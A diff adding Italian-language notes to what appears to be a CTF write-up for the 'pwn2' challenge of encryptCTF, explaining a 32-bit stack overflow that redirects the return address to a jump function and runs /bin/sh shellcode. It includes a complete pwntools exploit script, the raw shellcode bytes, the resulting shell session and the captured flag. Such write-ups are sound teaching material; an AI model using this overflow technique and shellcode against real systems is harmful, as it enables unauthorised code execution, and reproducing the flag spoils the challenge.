@@ -96,5 +96,31 @@ Ed ora abbiamo ciò che ci serve
 
 
 4)pwn2
+	C'è una funzione lol che usa jump
+	Potrei modificare l'indirizzo di ritorno e mettere quello della funzione lol, ed in ESP la shellcode
+	
+	l'indirizzo di ritorno inizia dopo 44 Bytes
+	
+	L'istruzione contenuta in EIP viene eseguita appena è finito il main.
+	EIP=>LOL
+	quando inizia ad eseguire la funzione, lo stack è stato sovraccaricato ed ESP punterà alla shellcode
+	Nota: se shellcode generate non funziona, fai prima un overflow per esempio con cyclic
+	
+	from pwn import *
+	p=process('./pwn2')
+	e=ELF('./pwn2')
+	#arch 32bit
+	garbage=b'A'*44
+	target=p32(e.symbols['lol'])
+	shellcode=b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
+	payload=garbage + target + shellcode
+	p.sendline(payload)
+	p.interactive()
+	
+	$ ls
+	HINTS         exploit.py  peda-session-ls.txt    pwn2
+	description.txt  flag.txt    peda-session-pwn2.txt  pwn2.c
+	$ cat flag.txt
+	=> encryptCTF{N!c3_j0b_jump3R}
 
 
